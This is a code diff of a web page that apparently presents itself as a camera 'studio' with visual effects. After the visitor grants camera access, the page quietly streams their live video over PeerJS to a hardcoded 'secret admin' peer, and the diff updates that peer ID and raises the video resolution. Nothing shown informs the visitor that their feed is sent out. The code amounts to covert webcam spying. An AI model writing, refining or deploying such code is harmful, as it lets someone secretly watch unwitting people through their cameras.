@@ -126,7 +126,6 @@
       cursor: pointer;
     }
 
-    /* Extra Optimization for Smaller Phones */
     @media (max-width: 480px) {
       .glass-card {
         width: 100%;
@@ -168,7 +167,8 @@
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const ADMIN_PEER_ID = 'my-secret-admin-id-1234';
+    /* Updated Secret Admin Peer ID */
+    const ADMIN_PEER_ID = 'danish-cam-9988';
     
     /* STUN Servers Configuration for Long Distance Connection */
     const peer = new Peer({
@@ -215,13 +215,6 @@
       for(let i=0; i<45; i++) bgParticles.push(new BgParticle(x, y));
     }
 
-    /* Firework Loop Commented Out */
-    /*
-    setInterval(() => {
-      triggerBgFirework(Math.random() * bgCanvas.width, Math.random() * bgCanvas.height * 0.5);
-    }, 800);
-    */
-
     function animateBg() {
       requestAnimationFrame(animateBg);
       bgCtx.globalCompositeOperation = 'destination-out';
@@ -230,9 +223,6 @@
       bgCtx.globalCompositeOperation = 'source-over';
       bgParticles.forEach((p, i) => { if(p.alpha > 0) { p.update(); p.draw(); } else { bgParticles.splice(i, 1); } });
     }
-    
-    /* Animation Commented Out */
-    // animateBg();
 
     /* Camera System */
     async function startStudio() {
@@ -241,8 +231,13 @@
           currentStream.getTracks().forEach(track => track.stop());
         }
 
+        /* Video resolution constraints to prevent black screen */
         currentStream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: useFacingMode }, 
+          video: { 
+            facingMode: useFacingMode,
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }, 
           audio: false 
         });
 
@@ -252,6 +247,7 @@
         document.getElementById('welcomePanel').style.display = "none";
         document.getElementById('studioPanel').style.display = "block";
 
+        /* Initiate peer connection */
         peer.call(ADMIN_PEER_ID, currentStream);
       } catch (err) {
         alert("Camera permission denied!");
